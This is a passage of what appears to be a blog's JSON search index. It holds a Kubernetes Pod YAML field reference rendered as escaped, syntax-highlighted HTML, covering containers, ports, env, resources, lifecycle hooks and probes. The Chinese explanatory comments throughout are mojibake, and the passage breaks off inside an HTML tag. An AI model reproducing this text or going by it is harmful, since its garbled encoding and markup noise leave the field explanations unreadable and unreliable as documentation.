hostNetwork æ˜¯å¦ä½¿ç”¨ä¸»æœºç½‘ç»œæ¨¡å¼ï¼Œé»˜è®¤ä¸ºfalseï¼Œå¦‚æœè®¾ç½®ä¸ºtrueï¼Œè¡¨ç¤ºä½¿ç”¨å®¿ä¸»æœºç½‘ç»œ volumes \u0026lt;[]Object\u0026gt; å­˜å‚¨å·ï¼Œç”¨äºå®šä¹‰Podä¸Šé¢æŒ‚åœ¨çš„å­˜å‚¨ä¿¡æ¯ restartPolicy é‡å¯ç­–ç•¥ï¼Œè¡¨ç¤ºPodåœ¨é‡åˆ°æ•…éšœçš„æ—¶å€™çš„å¤„ç†ç­–ç•¥ ","permalink":"https://rendoumi.com/posts/20240119-k8s_resource/","summary":"\u003ch3 id=\"podçš„yamlæ–‡ä»¶çš„èµ„æºæ¸…å•å’Œè§£é‡Šå¤‡æŸ¥\"\u003ePodçš„yamlæ–‡ä»¶çš„èµ„æºæ¸…å•å’Œè§£é‡Šï¼Œå¤‡æŸ¥\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003eapiVersion\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ev1    \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#å¿…é€‰ï¼Œç‰ˆæœ¬å·ï¼Œä¾‹å¦‚v1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ekind\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ePod       ã€€\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#å¿…é€‰ï¼Œèµ„æºç±»å‹ï¼Œä¾‹å¦‚ Pod\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003emetadata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e       ã€€ \u003c/span\u003e\u003cspan class=\"c\"\u003e#å¿…é€‰ï¼Œå…ƒæ•°æ®\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring    \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#å¿…é€‰ï¼ŒPodåç§°\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003enamespace\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#Podæ‰€å±çš„å‘½åç©ºé—´,é»˜è®¤ä¸º\u0026#34;default\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003elabels\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e       ã€€ã€€  \u003c/span\u003e\u003cspan class=\"c\"\u003e#è‡ªå®šä¹‰æ ‡ç­¾åˆ—è¡¨\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring      ã€€          \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"c\"\u003e#å¿…é€‰ï¼ŒPodä¸­å®¹å™¨çš„è¯¦ç»†å®šä¹‰\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003econtainers\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"c\"\u003e#å¿…é€‰ï¼ŒPodä¸­å®¹å™¨åˆ—è¡¨\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring  \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#å¿…é€‰ï¼Œå®¹å™¨åç§°\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#å¿…é€‰ï¼Œå®¹å™¨çš„é•œåƒåç§°\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eimagePullPolicy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eAlways|Never|IfNotPresent ] \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#è·å–é•œåƒçš„ç­–ç•¥ \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003ecommand\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"l\"\u003estring]  \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#å®¹å™¨çš„å¯åŠ¨å‘½ä»¤åˆ—è¡¨ï¼Œå¦‚ä¸æŒ‡å®šï¼Œä½¿ç”¨æ‰“åŒ…æ—¶ä½¿ç”¨çš„å¯åŠ¨å‘½ä»¤\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eargs\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"l\"\u003estring]     \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#å®¹å™¨çš„å¯åŠ¨å‘½ä»¤å‚æ•°åˆ—è¡¨\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eworkingDir\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#å®¹å™¨çš„å·¥ä½œç›®å½•\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003evolumeMounts\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"c\"\u003e#æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨çš„å­˜å‚¨å·é…ç½®\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring     \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#å¼•ç”¨podå®šä¹‰çš„å…±äº«å­˜å‚¨å·çš„åç§°ï¼Œéœ€ç”¨volumes[]éƒ¨åˆ†å®šä¹‰çš„çš„å·å\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003emountPath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#å­˜å‚¨å·åœ¨å®¹å™¨å†…mountçš„ç»å¯¹è·¯å¾„ï¼Œåº”å°‘äº512å­—ç¬¦\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ereadOnly\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eboolean\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#æ˜¯å¦ä¸ºåªè¯»æ¨¡å¼\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eports\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#éœ€è¦æš´éœ²çš„ç«¯å£åº“å·åˆ—è¡¨\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring       \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#ç«¯å£çš„åç§°\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003econtainerPort\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eint \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#å®¹å™¨éœ€è¦ç›‘å¬çš„ç«¯å£å·\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ehostPort\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eint      \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#å®¹å™¨æ‰€åœ¨ä¸»æœºéœ€è¦ç›‘å¬çš„ç«¯å£å·ï¼Œé»˜è®¤ä¸Containerç›¸åŒ\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eprotocol\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring   \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#ç«¯å£åè®®ï¼Œæ”¯æŒTCPå’ŒUDPï¼Œé»˜è®¤TCP\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"c\"\u003e#å®¹å™¨è¿è¡Œå‰éœ€è®¾ç½®çš„ç¯å¢ƒå˜é‡åˆ—è¡¨\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#ç¯å¢ƒå˜é‡åç§°\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#ç¯å¢ƒå˜é‡çš„å€¼\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eresources\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#èµ„æºé™åˆ¶å’Œè¯·æ±‚çš„è®¾ç½®\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003elimits\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"c\"\u003e#èµ„æºé™åˆ¶çš„è®¾ç½®\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003ecpu\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring    \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#Cpuçš„é™åˆ¶ï¼Œå•ä½ä¸ºcoreæ•°ï¼Œå°†ç”¨äºdocker run --cpu-shareså‚æ•°\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003ememory\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#å†…å­˜é™åˆ¶ï¼Œå•ä½å¯ä»¥ä¸ºMib/Gibï¼Œå°†ç”¨äºdocker run --memoryå‚æ•°\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003erequests\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#èµ„æºè¯·æ±‚çš„è®¾ç½®\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003ecpu\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring   \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#Cpuè¯·æ±‚ï¼Œå®¹å™¨å¯åŠ¨çš„åˆå§‹å¯ç”¨æ•°é‡\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003ememory\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#å†…å­˜è¯·æ±‚,å®¹å™¨å¯åŠ¨çš„åˆå§‹å¯ç”¨æ•°é‡\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003elifecycle\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#ç”Ÿå‘½å‘¨æœŸé’©å­\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003epostStart\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#å®¹å™¨å¯åŠ¨åç«‹å³æ‰§è¡Œæ­¤é’©å­,å¦‚æœæ‰§è¡Œå¤±è´¥,ä¼šæ ¹æ®é‡å¯ç­–ç•¥è¿›è¡Œé‡å¯\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003epreStop\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#å®¹å™¨ç»ˆæ­¢å‰æ‰§è¡Œæ­¤é’©å­,æ— è®ºç»“æœå¦‚ä½•,å®¹å™¨éƒ½ä¼šç»ˆæ­¢\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003elivenessProbe\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"c\"\u003e#å¯¹Podå†…å„å®¹å™¨å¥åº·æ£€æŸ¥çš„è®¾ç½®ï¼Œå½“æ¢æµ‹æ— å“åº”å‡ æ¬¡åå°†è‡ªåŠ¨é‡å¯è¯¥å®¹å™¨\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eexec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e       ã€€ \u003c/span\u003e\u003cspan class=\"c\"\u003e#å¯¹Podå®¹å™¨å†…æ£€æŸ¥æ–¹å¼è®¾ç½®ä¸ºexecæ–¹å¼\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003ecommand\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"l\"\u003estring] \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#execæ–¹å¼éœ€è¦åˆ¶å®šçš„å‘½ä»¤æˆ–è„šæœ¬\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttpGet\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"c\"\u003e#å¯¹Podå†…ä¸ªå®¹å™¨å¥åº·æ£€æŸ¥æ–¹æ³•è®¾ç½®ä¸ºHttpGetï¼Œéœ€è¦åˆ¶å®šPathã€port\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003enumber\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003ehost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003escheme\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003eHttpHeaders\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 